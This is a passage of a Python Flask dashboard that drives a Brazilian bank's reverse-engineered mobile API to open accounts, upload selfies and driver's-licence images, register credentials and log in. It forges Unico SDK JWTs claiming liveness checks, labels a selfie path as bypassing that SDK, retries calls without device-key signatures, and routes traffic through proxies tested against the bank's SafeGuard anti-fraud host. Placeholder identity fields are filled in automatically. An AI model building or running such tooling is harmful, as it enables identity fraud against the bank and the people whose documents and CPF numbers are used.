                while buf.tell() > target_kb * 1024 and quality > 40:
                    quality -= 3
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=quality, optimize=True)
                original_size = len(file_data)
                file_data = buf.getvalue()
                add_log(f"  {field_name}: comprimido {original_size//1024}KB -> {len(file_data)//1024}KB (q={quality})", tag="UPLOAD")
            except Exception as e:
                add_log(f"  {field_name}: compressao falhou ({e}), usando original", "warn", tag="UPLOAD")

        add_log(f"Uploading {field_name} ({len(file_data)} bytes)...")

        def _upload_multipart(fname_default):
            mp_body, mp_ct = make_multipart_body(file_data, f.filename or fname_default)
            hdrs = h_simple(sid)
            hdrs["content-type"] = mp_ct
            return http.post(
                f"{FROTABANK['base']}/user/documents/upload",
                data=mp_body, headers=hdrs, timeout_seconds=30,
            )

        def _upload_json_encrypted():
            img_b64 = base64.b64encode(file_data).decode("utf-8")
            key_body_raw = b"version2" + os.urandom(1696)
            key_body_hex = key_body_raw.hex()
            jwt_jti = str(uuid.uuid4())
            jwt_uuid_logger = str(uuid.uuid4())
            payload_dict = {
                "iss": "unico-sdk-android",
                "capture": {"image": img_b64},
                "keyBody": key_body_hex,
                "jti": jwt_jti,
                "info": {
                    "platform": "ANDROID",
                    "version": "5.48.0",
                    "CameraNormal": True,
                    "CameraLiveness": True,
                    "uuidLogger": jwt_uuid_logger,
                    "sessionId": None,
                    "JWT_TYPE": 2,
                    "iInfo": {"status": False},
                },
            }
            hdr = base64.urlsafe_b64encode(b'{"alg":"HS256"}').rstrip(b"=").decode()
            payload_json = json.dumps(payload_dict, separators=(",", ":"))
            payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b"=").decode()
            signing_input = f"{hdr}.{payload_b64}".encode()
            host_key_str = FROTABANK["unico_host_key"]
            host_key = host_key_str.encode("utf-8")
            sig = hmac_mod.new(host_key, signing_input, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            encrypted_jwt = f"{hdr}.{payload_b64}.{sig_b64}"
            json_body = {"file": {"encrypted": encrypted_jwt}}
            add_log(f"  [JWT] campos: iss, capture.image({len(img_b64)}ch), keyBody({len(key_body_hex)}hex), jti={jwt_jti[:8]}..., info(JWT_TYPE=2)", tag="UPLOAD")
            add_log(f"  [JWT] payload JSON: {len(payload_json)} bytes | JWT total: {len(encrypted_jwt)} chars", tag="UPLOAD")
            add_log(f"  [JWT] assinatura: hostKey UTF-8 ({len(host_key)}B) | sig={sig_b64[:20]}...", tag="UPLOAD")
            req_hdrs = h_simple(sid)
            add_log(f"  [REQ] POST /user/documents/upload | Content-Type: {req_hdrs.get('content-type')} | sessionid: {sid[:12]}...", tag="UPLOAD")
            add_log(f"  [REQ] body size: {len(json.dumps(json_body))} chars", tag="UPLOAD")
            r = http.post(
                f"{FROTABANK['base']}/user/documents/upload",
                json=json_body,
                headers=req_hdrs,
                timeout_seconds=60,
            )
            add_log(f"  [RESP] status: {r.status_code}", tag="UPLOAD")
            resp_hdrs_important = {k: v for k, v in (r.headers or {}).items() if k.lower() in ("content-type", "x-request-id", "x-correlation-id", "server", "date", "retry-after", "www-authenticate")}
            if resp_hdrs_important:
                add_log(f"  [RESP] headers: {resp_hdrs_important}", tag="UPLOAD")
            if r.status_code not in (200, 201):
                body_text = r.text or ""
                add_log(f"  [RESP] body completo ({len(body_text)} chars): {body_text[:500]}", "error", tag="UPLOAD")
                if len(body_text) > 500:
                    add_log(f"  [RESP] ...continuacao: {body_text[500:1000]}", "error", tag="UPLOAD")
            else:
                add_log(f"  [RESP] body: {r.text[:300]}", "success", tag="UPLOAD")
            return r

        if is_pdf:
            r = _upload_multipart(f"{field_name}.pdf")
        elif is_selfie:
            add_log("  selfie: multipart simples (bypass Unico SDK)", tag="UPLOAD")
            r = _upload_multipart("selfie.jpg")
        else:
            r = _upload_multipart(f"{field_name}.jpg")

        if r.status_code in (200, 201):
            resp = r.json()
            url = resp.get("url") or resp.get("downloadUrl") or resp.get("link", "")
            state["uploaded_urls"][field_name] = url
            add_log(f"  {field_name}: OK ({len(file_data)} bytes) -> url type: {type(url).__name__}", "success", tag="UPLOAD")
            if isinstance(url, dict):
                add_log(f"  {field_name}: url keys: {list(url.keys())}", "success", tag="UPLOAD")
            results[field_name] = {"ok": True, "url": str(url)[:80] if isinstance(url, str) else "obj"}
        else:
            if not is_selfie:
                add_log(f"  {field_name}: FALHOU ({r.status_code}) {r.text[:300]}", "error", tag="UPLOAD")
            results[field_name] = {"ok": False, "status": r.status_code, "msg": r.text[:500]}

    state["steps_completed"].append("upload_done")
    return jsonify({"ok": True, "results": results})


@app.route("/api/onboard/validate-selfie", methods=["POST"])
def onboard_validate_selfie():
    sid = state["session_id"]
    person = state.get("person_data", {})
    urls = state["uploaded_urls"]

    body = {
        "uuid": state["device_uuid"],
        "deviceId": state["device_id"],
        "userDocument": state["cpf"],
        "userFullName": person.get("name", ""),
        "userBirthdate": to_iso(person.get("birthday", "")),
        "document": state["cpf"],
        "selfieUrl": urls.get("selfie", ""),
        "frontDocumentPhotoUrl": urls.get("cnhFront", ""),
        "backDocumentPhotoUrl": urls.get("cnhBack", ""),
        "onlyValidation": True,
    }

    add_log("validate-selfie-and-document (com userInfo)...")
    path = "/v2/device-key/validate-selfie-and-document"
    headers = h_with_dk(sid=sid, method="POST", path=path, body=body, config_headers={})
    r = http.post(f"{FROTABANK['base']}{path}", json=body, headers=headers, timeout_seconds=15)

    add_log(f"  Status: {r.status_code} | {r.text[:300] or '(vazio)'}")

    if r.status_code in (200, 201, 204):
        state["dk_validated"] = True
        state["steps_completed"].append("dk_validated")
        add_log("Device key validada via selfie!", "success")
        return jsonify({"ok": True, "method": "selfie"})

    return jsonify({
        "ok": False,
        "status": r.status_code,
        "msg": r.text[:500],
        "needs_code": True,
    })


@app.route("/api/onboard/send-dk-code", methods=["POST"])
def onboard_send_dk_code():
    delivery_raw = request.json.get("deliveryMethod", "whatsapp") if request.json else "whatsapp"
    delivery = DELIVERY_MAP.get(delivery_raw, "whatsapp")
    add_log(f"Enviando codigo deviceKeyLight via {delivery_raw} (API: {delivery})...")
    r = http.post(
        f"{FROTABANK['base']}/v2/verification-code/send",
        json={
            "verificationCodeType": "deviceKeyLight",
            "phone": state["phone"],
            "deliveryMethod": delivery,
        },
        headers=h_simple(state["session_id"]),
    )
    if r.status_code == 200:
        add_log("Codigo deviceKeyLight enviado!", "success")
        return jsonify({"ok": True})
    add_log(f"Falha: {r.status_code}", "error")
    return jsonify({"ok": False, "msg": r.text[:300]}), 400


@app.route("/api/onboard/validate-code", methods=["POST"])
def onboard_validate_code():
    code = request.json.get("code", "").strip()
    body = {
        "uuid": state["device_uuid"],
        "deviceId": state["device_id"],
        "document": state["cpf"],
        "phone": state["phone"],
        "verificationCode": code,
    }
    path = "/v2/device-key/validate-with-code"

    add_log("validate-with-code sem DK...")
    r = http.post(f"{FROTABANK['base']}{path}", json=body, headers=h_simple(state["session_id"]), timeout_seconds=15)
    add_log(f"  Sem DK: {r.status_code}")

    if r.status_code not in (200, 201, 204):
        add_log("validate-with-code com DK...")
        headers = h_with_dk(sid=state["session_id"], method="POST", path=path, body=body, config_headers={})
        r = http.post(f"{FROTABANK['base']}{path}", json=body, headers=headers, timeout_seconds=15)
        add_log(f"  Com DK: {r.status_code}")

    if r.status_code in (200, 201, 204):
        state["dk_validated"] = True
        state["steps_completed"].append("dk_validated")
        add_log("Device key validada via codigo!", "success")
        return jsonify({"ok": True})

    add_log(f"Validacao falhou: {r.text[:200]}", "error")
    return jsonify({"ok": False, "status": r.status_code, "msg": r.text[:300]}), 400


@app.route("/api/onboard/send-documents", methods=["POST"])
def onboard_send_documents():
    sid = state["session_id"]
    urls = state["uploaded_urls"]
    path = "/v2/persons/send-document"
    results = {}

    docs = [
        {"link": urls.get("selfie", ""), "type": "selfie"},
        {"link": urls.get("cnhFront", ""), "type": "cnhFront"},
        {"link": urls.get("cnhBack", ""), "type": "cnhBack"},
    ]

    for doc in docs:
        if not doc["link"]:
            results[doc["type"]] = {"ok": False, "msg": "sem URL"}
            continue
        add_log(f"send-document: {doc['type']}...")
        headers = h_with_dk(sid=sid, method="POST", path=path, body=doc, config_headers={})
        r = http.post(f"{FROTABANK['base']}{path}", json=doc, headers=headers, timeout_seconds=15)
        add_log(f"  {doc['type']}: {r.status_code}")
        ok = r.status_code in (200, 201, 204)
        results[doc["type"]] = {"ok": ok, "status": r.status_code, "msg": r.text[:200] if not ok else ""}

        if not ok:
            r2 = http.post(f"{FROTABANK['base']}{path}", json=doc, headers=h_simple(sid), timeout_seconds=15)
            if r2.status_code in (200, 201, 204):
                results[doc["type"]] = {"ok": True, "status": r2.status_code}
                add_log(f"  {doc['type']}: OK (sem DK)", "success")

    all_ok = all(v.get("ok") for v in results.values())
    if all_ok:
        state["steps_completed"].append("docs_sent")
        add_log("Todos documentos enviados!", "success")

    return jsonify({"ok": all_ok, "results": results})


@app.route("/api/onboard/create-user", methods=["POST"])
def onboard_create_user():
    sid = state["session_id"]
    person = state.get("person_data") or {}
    addr = state.get("address") or {}
    req_data = request.json or {}
    password = req_data.get("password", "Senh@2024!")

    dk_ok, dk_err = _ensure_device_key()
    if not dk_ok:
        add_log(f"Device key falhou, tentando sem DK: {dk_err}", "warn", tag="DK")

    payload = {
        "addresses": [{
            "zipCode": re.sub(r"\D", "", person.get("zipCode", "80420000")),
            "street": person.get("street") or addr.get("street", "Rua Exemplo"),
            "number": person.get("number", "100"),
            "complement": person.get("complement", ""),
            "neighborhood": person.get("neighborhood") or addr.get("neighborhood", "Centro"),
            "city": person.get("city") or addr.get("city", "Curitiba"),
            "state": person.get("state") or addr.get("state", "PR"),
        }],
        "birthday": to_iso(person.get("birthday", "01/01/1990")),
        "documentNumber": state["cpf"],
        "email": person.get("email", f"test{state['cpf'][:6]}@gmail.com"),
        "name": person.get("name", "TESTE USUARIO"),
        "password": password,
        "phone": state["phone"],
        "terms": state.get("terms", []),
        "isPEP": person.get("isPEP", False),
        "monthlyIncome": int(person.get("monthlyIncome", 5000)),
        "motherName": person.get("motherName", "MAE TESTE"),
        "professionId": 1,
        "type": "person",
        "partners": [],
        "deviceKeyInstallation": {
            "uuid": state["device_uuid"],
            "deviceId": state["device_id"],
        },
        "rg": person.get("rg", "000000000"),
        "rgIssuingDate": to_iso(person.get("rgIssuingDate", "14/10/2022")),
        "documents": _build_documents_array(),
    }

    sid_age = int(time.time() - state.get("session_received_at", time.time()))
    add_log(f"POST /user disparado (sid tem {sid_age}s)", tag="USER")
    path = "/user"
    headers = h_with_dk(sid=sid, method="POST", path=path, body=payload, config_headers={})
    r = http.post(f"{FROTABANK['base']}{path}", json=payload, headers=headers, timeout_seconds=30)
    add_log(f"Resposta: {r.status_code} body: {r.text[:400]}", tag="USER", level="info" if r.status_code < 400 else "error")

    if r.status_code in (200, 201):
        state["steps_completed"].append("user_created")
        add_log("Conta criada com sucesso", "success", tag="USER")
        return jsonify({"ok": True, "response": r.json() if r.text else {}})

    # Detecta SESSION_EXPIRED especificamente
    err_code = ""
    try:
        err_code = r.json().get("error", {}).get("code", "")
    except Exception:
        pass

    if r.status_code == 401 and err_code == "BANK_API_ONBOARDING_SESSION_EXPIRED":
        add_log(f"Sessao expirou (sid tinha {int(time.time() - state.get('session_received_at', time.time()))}s). Cliente precisa reenviar codigo.", "error", tag="AUTH")
        return jsonify({
            "ok": False,
            "status": 401,
            "msg": "SESSION_EXPIRED",
            "action": "reauth",  # frontend reage pra pedir reenviar codigo
            "phone": state["phone"],
        }), 401

    if r.status_code == 401:
        add_log(f"401 nao-session-expired, tentando sem DK (fallback)...", "warn", tag="USER")
        r = http.post(f"{FROTABANK['base']}{path}", json=payload, headers=h_simple(sid), timeout_seconds=30)
        if r.status_code in (200, 201):
            state["steps_completed"].append("user_created")
            add_log("CONTA CRIADA (sem DK)!", "success")
            return jsonify({"ok": True, "response": r.json() if r.text else {}})

    add_log(f"Falha: {r.text[:400]}", "error")
    return jsonify({"ok": False, "status": r.status_code, "msg": r.text[:500]}), 400


@app.route("/api/onboard/status", methods=["GET"])
def onboard_status():
    return jsonify({
        "cpf": state["cpf"],
        "phone": state["phone"],
        "session_id": state["session_id"][:20] + "..." if state["session_id"] else None,
        "person": state["person_data"],
        "device_uuid": state["device_uuid"],
        "device_id": state["device_id"],
        "dk_validated": state["dk_validated"],
        "uploaded_urls": {k: v[:60] + "..." for k, v in state["uploaded_urls"].items()},
        "steps": state["steps_completed"],
    })


@app.route("/api/onboard/cred-send-code", methods=["POST"])
def onboard_cred_send_code():
    cpf = state["cpf"]
    data = request.json or {}
    phone_raw = re.sub(r"\D", "", data.get("phone", "") or "")
    delivery_raw = data.get("deliveryMethod", "whatsapp")
    delivery = DELIVERY_MAP.get(delivery_raw, "whatsapp")

    if not cpf:
        return jsonify({"ok": False, "msg": "CPF ausente"}), 400

    # Fluxo real do app (decompiled.js linha 1314730): o app chama sendVerificationCode
    # com phone=undefined pra createCredential. O backend busca o phone pelo CPF.
    # Passamos phone se o usuario informou, senao mandamos null (igual ao app).
    phone_payload = phone_raw if (phone_raw and len(phone_raw) >= 10) else None
    if phone_payload:
        state["phone"] = phone_payload

    payload = {
        "verificationCodeType": "createCredential",
        "document": cpf,
        "deliveryMethod": delivery,
    }
    if phone_payload:
        payload["phone"] = phone_payload
    else:
        payload["phone"] = None

    add_log(f"[CRED] Enviando codigo createCredential (doc={cpf[:3]}...{cpf[-2:]}, via={delivery_raw}/{delivery}, phone={'informado' if phone_payload else 'auto'})", tag="CRED")

    r = http.post(
        f"{FROTABANK['base']}/v2/verification-code/send",
        json=payload,
        headers=h_simple(),
    )

    if r.status_code == 200:
        add_log(f"Codigo createCredential enviado via {delivery_raw}!", "success")
        return jsonify({"ok": True, "msg": f"Codigo enviado via {delivery_raw}"})

    add_log(f"Falha envio codigo: {r.status_code} {r.text[:200]}", "error")
    return jsonify({"ok": False, "msg": r.text[:300], "status": r.status_code}), 400


@app.route("/api/onboard/create-credential", methods=["POST"])
def onboard_create_credential():
    cpf = state["cpf"]
    data = request.json or {}
    password = data.get("password", "")
    code = data.get("verificationCode", "").strip()

    if not cpf or not password or not code:
        return jsonify({"ok": False, "msg": "CPF, senha e codigo obrigatorios"}), 400

    # Fluxo real (decompiled.js 1314814-1314834): payload direto { document, password, verificationCode }
    # NAO precisa de /phone/confirmation antes, nao precisa de sessionId, nao precisa de device-key-signature.
    # Backend valida verificationCode contra o doc e grava a credential.
    add_log(f"[CRED] POST /v2/auth/credential (doc={cpf[:3]}...{cpf[-2:]}, codigo={code[:2]}...)", tag="CRED")

    body = {
        "document": cpf,
        "password": password,
        "verificationCode": code,
    }

    r = http.post(
        f"{FROTABANK['base']}/v2/auth/credential",
        json=body,
        headers=h_simple(),
    )

    add_log(f"create-credential: {r.status_code} {r.text[:200]}")

    try:
        resp = r.json()
    except Exception:
        resp = {}

    if r.status_code in (200, 201):
        add_log("Credencial criada com sucesso!", "success")
        return jsonify({"ok": True, "data": resp})

    error_code = ""
    if isinstance(resp, dict):
        error_code = resp.get("error", {}).get("code", "") or resp.get("code", "")
    add_log(f"Erro criar credencial: {r.status_code} {error_code} {r.text[:200]}", "error")
    return jsonify({"ok": False, "msg": r.text[:300], "error_code": error_code, "status": r.status_code}), r.status_code


@app.route("/api/onboard/login", methods=["POST"])
def onboard_login():
    cpf = state["cpf"]
    password = (request.json or {}).get("password", "")
    if not cpf or not password:
        return jsonify({"ok": False, "msg": "CPF ou senha ausente"}), 400

    add_log(f"Tentando login para {cpf[:3]}...{cpf[-2:]}")
    body = {
        "document": cpf,
        "password": password,
    }
    r = http.post(
        f"{FROTABANK['base']}/v2/auth/multifactor-login",
        json=body,
        headers=h_simple(state["session_id"]),
    )
    add_log(f"Login: {r.status_code}")

    try:
        data = r.json()
    except Exception:
        data = {}

    if r.status_code == 200:
        add_log("Login OK!", "success")
        token = data.get("accessToken", data.get("token", ""))
        return jsonify({"ok": True, "data": data, "token": token})

    error_code = ""
    if isinstance(data, dict):
        error_code = data.get("error", {}).get("code", "")

    if r.status_code == 401:
        add_log(f"Credenciais invalidas: {error_code}", "error")
        return jsonify({"ok": False, "msg": "Senha incorreta", "error_code": error_code}), 401

    add_log(f"Erro no login: {r.status_code} {r.text[:200]}", "error")
    return jsonify({"ok": False, "msg": r.text[:300], "status": r.status_code}), r.status_code


@app.route("/api/onboard/login-send-code", methods=["POST"])
def onboard_login_send_code():
    """Fluxo de LOGIN pra conta ja cadastrada. Passo 1: enviar codigo."""
    data = request.json or {}
    cpf = re.sub(r"\D", "", data.get("cpf", "") or state.get("cpf", ""))
    phone = re.sub(r"\D", "", data.get("phone", ""))
    delivery_raw = data.get("deliveryMethod", "whatsapp")
    delivery = DELIVERY_MAP.get(delivery_raw, "whatsapp")

    if not cpf or not phone:
        return jsonify({"ok": False, "msg": "CPF e telefone obrigatorios"}), 400

    state["cpf"] = cpf
    state["phone"] = phone
    if not state.get("device_uuid"):
        state["device_uuid"] = str(uuid.uuid4())
        state["device_id"] = uuid.uuid4().hex[:16]

    add_log(f"[LOGIN] Enviando codigo para {phone} via {delivery_raw}", tag="LOGIN")
    r = http.post(
        f"{FROTABANK['base']}/v2/verification-code/send",
        json={"verificationCodeType": "onboarding", "phone": phone, "deliveryMethod": delivery},
        headers=h_simple(),
        timeout_seconds=15,
    )
    if r.status_code == 200:
        add_log(f"[LOGIN] Codigo enviado via {delivery_raw}", "success", tag="LOGIN")
        return jsonify({"ok": True})
    add_log(f"[LOGIN] Falha envio: {r.status_code} {r.text[:150]}", "error", tag="LOGIN")
    return jsonify({"ok": False, "status": r.status_code, "msg": r.text[:300]}), 400


@app.route("/api/onboard/login-complete", methods=["POST"])
def onboard_login_complete():
    """Fluxo de LOGIN pra conta ja cadastrada. Passo 2:
    verify code -> device_key SafeGuard -> POST /v2/auth/login"""
    data = request.json or {}
    code = data.get("code", "").strip()
    password = data.get("password", "")
    cpf = state["cpf"]

    if not code or not password:
        return jsonify({"ok": False, "msg": "Codigo e senha obrigatorios"}), 400

    # 1. phone/confirmation -> sessionid
    add_log("[LOGIN] Verificando codigo", tag="LOGIN")
    r_conf = http.post(
        f"{FROTABANK['base']}/phone/confirmation",
        json={"phone": state["phone"], "verificationCode": code},
        headers=h_simple(),
        timeout_seconds=30,
    )
    if r_conf.status_code != 200:
        add_log(f"[LOGIN] Codigo invalido: {r_conf.text[:200]}", "error", tag="LOGIN")
        return jsonify({"ok": False, "msg": r_conf.text[:300], "stage": "verify"}), 400

    sid = r_conf.json().get("sessionId", "")
    if not sid:
        return jsonify({"ok": False, "msg": "SessionId nao retornado"}), 400
    state["session_id"] = sid
    state["session_received_at"] = time.time()
    add_log(f"[LOGIN] sessionId obtido ({sid[:8]}...)", "success", tag="LOGIN")

    # 2. Device key no SafeGuard
    dk_ok, dk_err = _ensure_device_key()
    if not dk_ok:
        add_log(f"[LOGIN] device_key falhou: {dk_err}", "error", tag="LOGIN")
        return jsonify({"ok": False, "msg": "device_key falhou", "stage": "device_key"}), 400

    # 3. POST /v2/auth/login com device_key_signature
    body = {"document": cpf, "password": password}
    path = "/v2/auth/login"
    headers = h_with_dk(sid=sid, method="POST", path=path, body=body, config_headers={})
    add_log(f"[LOGIN] POST /v2/auth/login", tag="LOGIN")
    r_login = http.post(f"{FROTABANK['base']}{path}", json=body, headers=headers, timeout_seconds=30)
    add_log(f"[LOGIN] Resposta: {r_login.status_code} body: {r_login.text[:300]}", tag="LOGIN")

    if r_login.status_code == 200:
        resp = r_login.json()
        token = resp.get("token") or resp.get("accessToken") or ""
        state["steps_completed"].append("logged_in")
        add_log(f"[LOGIN] LOGADO com sucesso! Token: {token[:30]}...", "success", tag="LOGIN")
        return jsonify({"ok": True, "token": token, "data": resp})

    err_code = ""
    try:
        err_code = r_login.json().get("code") or r_login.json().get("error", {}).get("code", "")
    except Exception:
        pass
    add_log(f"[LOGIN] Falhou: {err_code or r_login.text[:200]}", "error", tag="LOGIN")
    return jsonify({"ok": False, "status": r_login.status_code, "error_code": err_code, "msg": r_login.text[:400]}), r_login.status_code


@app.route("/api/logs", methods=["GET"])
def get_logs():
    return jsonify(state["logs"][-50:])


@app.route("/api/proxy/test", methods=["POST"])
def proxy_test():
    raw = (request.json or {}).get("proxy", "").strip()
    url = _parse_proxy(raw)
    if not url:
        return jsonify({"ok": False, "msg": "Proxy vazio"}), 400
    import requests as _rq
    proxies = {"http": url, "https": url}
    results = {}
    try:
        r = _rq.get("https://ipinfo.io/json", proxies=proxies, timeout=15)
        results["ip_info"] = r.json() if r.status_code == 200 else {"status": r.status_code}
    except Exception as e:
        return jsonify({"ok": False, "msg": f"Proxy inacessivel: {type(e).__name__}: {str(e)[:200]}"}), 502
    # Test SafeGuard (o problematico)
    try:
        r = _rq.get("https://id.c03.frotabank.com.br/", proxies=proxies, timeout=20)
        results["safeguard"] = {"status": r.status_code, "ok": r.status_code < 500}
    except Exception as e:
        return jsonify({"ok": False, "msg": f"SafeGuard bloqueado: {type(e).__name__}: {str(e)[:200]}", "ip_info": results.get("ip_info")}), 502
    try:
        r = _rq.get("https://api.c03.frotabank.com.br/", proxies=proxies, timeout=10)
        results["api"] = {"status": r.status_code}
    except Exception as e:
        results["api"] = {"error": str(e)[:150]}
    add_log(f"[PROXY] Teste OK via {results['ip_info'].get('ip', '?')} ({results['ip_info'].get('country', '?')})", "success", tag="PROXY")
    return jsonify({"ok": True, **results})


@app.route("/api/proxy/save", methods=["POST"])
def proxy_save():
    raw = (request.json or {}).get("proxy", "").strip()
    if not raw:
        state["proxy"] = None
        add_log("[PROXY] Proxy removido", "info", tag="PROXY")
        return jsonify({"ok": True, "proxy": None})
    url = _parse_proxy(raw)
    if not url:
        return jsonify({"ok": False, "msg": "Formato invalido"}), 400
    state["proxy"] = raw
    add_log(f"[PROXY] Salvo: {url.split('@')[-1] if '@' in url else url}", "success", tag="PROXY")
    return jsonify({"ok": True, "proxy": raw, "parsed": url})


@app.route("/api/proxy/current", methods=["GET"])
def proxy_current():
    return jsonify({"proxy": state.get("proxy"), "parsed": _parse_proxy(state.get("proxy"))})


if __name__ == "__main__":
    print("\n" + "=" * 50)
    print("  Frotabank Onboarding Dashboard")
    print("  http://localhost:5000")
    print("=" * 50 + "\n")
    app.run(debug=False, port=int(os.environ.get("FLASK_PORT", 5000)), host="0.0.0.0")
